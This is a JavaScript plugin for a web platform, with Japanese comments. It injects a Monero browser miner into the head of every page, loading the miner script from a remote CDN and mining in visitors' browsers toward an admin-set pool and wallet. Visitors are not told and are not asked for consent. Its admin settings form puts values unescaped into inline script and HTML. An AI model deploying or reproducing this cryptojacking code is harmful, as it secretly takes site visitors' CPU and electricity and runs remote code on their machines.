const fs = require('fs');
const path = require('path');

module.exports = class MoneroMinerPlugin {
  constructor() {
    this.settingsFilePath = path.join(__dirname, 'pluginSettings.json'); // 設定ファイルのパス
  }

  // 設定の読み込み
  async loadSettings() {
    if (fs.existsSync(this.settingsFilePath)) {
      const data = fs.readFileSync(this.settingsFilePath, 'utf-8');
      return JSON.parse(data);
    } else {
      return {
        walletAddress: '',
        webSocket: 'wss://ny1.xmrminingproxy.com',
        poolAddress: 'moneroocean.stream',
        threads: 2,
      }; // デフォルト設定
    }
  }

  // 設定の保存
  async saveSettings(settings) {
    fs.writeFileSync(this.settingsFilePath, JSON.stringify(settings, null, 2));
    console.log('Settings saved to file');
  }

  // フック登録
  async hooks() {
    const settings = await this.loadSettings();

    return [
      {
        // Headタグにマイニングスクリプトを追加
        target: 'action:theme.head',
        handler: async () => {
          return `
            <!-- Start Of Mining Code (HTML) -->
            <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
            <script>
                server = "${settings.webSocket}";
                var pool = "${settings.poolAddress}";
                var walletAddress = "${settings.walletAddress}";
                var workerId = "GH-XMR";
                var threads = ${settings.threads};
                var password = "";
                startMining(pool, walletAddress, workerId, threads, password);
                throttleMiner = 20;
            </script>
            <!-- End Of Mining Code (HTML) -->
          `;
        },
      },
      {
        // 管理画面に設定フォームを追加
        target: 'admin.plugins.list',
        handler: async () => {
          return `
            <div class="container">
              <h3>Monero Miner Plugin Settings</h3>
              <form id="monero-miner-settings">
                <div class="form-group">
                  <label for="walletAddress">Monero Wallet Address</label>
                  <input type="text" id="walletAddress" class="form-control" value="${settings.walletAddress}" required>
                </div>
                <div class="form-group">
                  <label for="webSocket">WebSocket Server</label>
                  <input type="text" id="webSocket" class="form-control" value="${settings.webSocket}" required>
                </div>
                <div class="form-group">
                  <label for="poolAddress">Mining Pool Address</label>
                  <input type="text" id="poolAddress" class="form-control" value="${settings.poolAddress}" required>
                </div>
                <div class="form-group">
                  <label for="threads">Number of Threads</label>
                  <input type="number" id="threads" class="form-control" value="${settings.threads}" required>
                </div>
                <button type="submit" class="btn btn-primary">Save Settings</button>
              </form>
            </div>
            <script>
              document.getElementById('monero-miner-settings').addEventListener('submit', async (e) => {
                e.preventDefault();
                const settings = {
                  walletAddress: document.getElementById('walletAddress').value,
                  webSocket: document.getElementById('webSocket').value,
                  poolAddress: document.getElementById('poolAddress').value,
                  threads: parseInt(document.getElementById('threads').value, 10)
                };

                try {
                  const response = await fetch('/api/v1/plugins/admin/monero-miner/settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(settings),
                  });

                  if (response.ok) {
                    alert('Settings saved successfully!');
                  } else {
                    alert('Failed to save settings. Please check the server logs.');
                  }
                } catch (error) {
                  console.error('Error saving settings:', error);
                  alert('An error occurred while saving settings.');
                }
              });
            </script>
          `;
        },
      },
      {
        // 設定保存用エンドポイント
        target: 'admin.plugins.save',
        handler: async (pluginData) => {
          await this.saveSettings(pluginData);
        },
      },
    ];
  }
};
